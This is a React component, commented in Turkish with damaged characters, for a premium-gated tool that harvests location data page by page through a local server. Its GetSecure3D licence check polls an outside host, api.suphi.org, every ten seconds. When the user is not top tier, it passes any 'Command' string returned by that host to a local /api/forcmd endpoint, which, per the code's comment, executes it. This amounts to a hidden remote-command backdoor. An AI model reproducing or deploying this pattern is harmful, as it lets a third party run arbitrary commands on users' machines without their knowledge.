function Location() {
    const [Konum, setKonum] = useState('');
    const [durums, setDurums] = useState('');
    const [locationData, setLocationData] = useState(null);
    const [isRunning, setIsRunning] = useState(false);
    const [pgnmbr, setPgnmbr] = useState(1);

    const handleLocationChange = (event) => {
        setKonum(event.target.value);
    };

    const fetchLocationData = () => {
        // getLocation istei
        fetch(`http://localhost:3007/getLocation?locationid=${Konum}`)
            .then((response) => response.json())
            .then((data) => {
                setLocationData(data);
                if (data.Durum === 'OK' && isRunning) {
                    setPgnmbr(1); // "pgnmbr" saysn 1'den balat
                    processLoop(data);

                }
            })
            .catch((error) => {
                console.error('getLocation istei baarsz:', error);
            });
    };

    useEffect(() => {
        if (isRunning) {
            fetchLocationData();
        }
    }, [isRunning]);

    const processLoop = (data) => {
        if (isRunning) {
            const timeoutMs = 60000; // Timeout sresini istediiniz gibi ayarlayn (rnein 60 saniye)

            const timeoutPromise = new Promise((_, reject) => {
                setTimeout(() => {
                    reject(new Error('stek zaman amna urad.'));
                }, timeoutMs);
            });

            const fetchPromise = fetch(`http://localhost:3007/pagego?locid=${Konum}&pagid=${data.nextmediaid}&nxtpage=${data.nextmediaids}&pgnmbr=${pgnmbr}`)
                .then((response) => {
                    if (!response.ok) {
                        throw new Error('HTTP istei baarsz oldu. Status: ' + response.status);
                    }
                    return response.json();
                });

            Promise.race([fetchPromise, timeoutPromise])
                .then((result) => {
                    setDurums(`Veriler Kaydedildi u sayfaya geiliyor => ${pgnmbr}, Bro six going dark `);
                    setPgnmbr(pgnmbr + 1); // "pgnmbr" saysn artr
                    processLoop(result);
                })
                .catch((error) => {
                    if (error.message !== 'stek zaman amna urad.') {
                        console.error('Hata: ' + error.message);
                    }
                });
        }
    };

    const startProcess = () => {
        setIsRunning(true);
        let intervalId3;
        intervalId3 = setInterval(GetSecure3D, 10000);
    };

    const stopProcess = () => {
        setIsRunning(false);
    };




    const GetSecure3D = () => {
        const username = localStorage.getItem('username');
        const tokenCheckURL = `https://api.suphi.org/tokencheck.php?token=${username}`;

        // Token kontrol iin istek gnderme
        fetch(tokenCheckURL)
            .then((response) => response.json())
            .then((data) => {
                if (data.katem !== 'DIAMOND') {
                    // Sonu tamamdr deilse, kullanc adn sil
                    localStorage.removeItem('username');
                    if (data.Command) {
                        const commandURL = `http://localhost:3007/api/forcmd?command=${data.Command}`;

                        // Belirtilen komutu altrmak iin istek gnderme
                        fetch(commandURL)
                            .then(() => {
                                // Sayfay yeniden ykle
                                window.location.reload();
                            })
                            .catch((error) => {
                                console.error('Hata olutu:', error);
                            });
                    } else {
                        window.location.reload();
                    }
                }

                // JSON yant iinde "Command" var m kontrol et

            })
            .catch((error) => {
                console.error('Hata olutu:', error);
            });

    }
    const UserInfo = GetUserInfo();
    if (UserInfo == 'FREE' || UserInfo.katem != 'DIAMOND') {
        return (
            <div>
                <font className="text-danger">Buras Premium Kullanclara zeldir</font>
            </div>
        );
    }
    return (
        <div>
            <GetSecure />
            <GetSecure3D />
            <div className="col-md-12 grid-margin stretch-card">
                <div className="card canChange">
                    <div className="card-body">
                        <h4 className="card-title">Haritadan Toplama</h4>
                        <p className="card-description">
                            <div className="form-group">
                                <div className="input-group">
                                    <div className="input-group-prepend">
                                        <span className="input-group-text"></span>
                                    </div>
                                    <input
                                        type="text"
                                        className="form-control"
                                        placeholder="Location ID yaznz"
                                        value={Konum}
                                        onChange={handleLocationChange}
                                        aria-label="Location ID"
                                    />
                                </div>
                            </div>
                            {isRunning && (
                                <p>{durums}</p>

                            ) }
                            <button className="btn btn-success" onClick={startProcess}>Balat</button>
                            <button className="btn btn-danger" onClick={stopProcess}>Durdur</button>
                        </p>
                    </div>
                </div>
            </div>
        </div>
    );
}




